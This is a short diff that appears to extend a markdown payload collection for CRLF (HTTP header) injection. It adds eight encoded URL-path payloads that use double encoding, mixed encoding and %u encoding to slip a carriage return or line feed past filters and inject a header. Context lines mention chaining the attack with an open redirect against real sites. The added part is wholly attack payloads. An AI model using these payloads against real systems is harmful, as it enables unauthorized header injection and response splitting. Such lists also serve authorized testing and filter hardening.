@@ -22,6 +22,38 @@
 %3f%0dheader:header
 ```
 
+```
+/%250aheader:header
+```
+
+```
+/%25250aheader:header
+```
+
+```
+/%%0a0aheader:header
+```
+
+```
+/%3f%0dheader:header
+```
+
+```
+/%23%0dheader:header
+```
+
+```
+/%25%30aheader:header
+```
+
+```
+/%25%30%61header:header
+```
+
+```
+/%u000aheader:header
+```
+
 **CRLF chained with Open Redirect server misconfiguration**
 
 _Note:_ This sometimes works. (Discovered in some Yandex sites, was not exploitable from the root.)
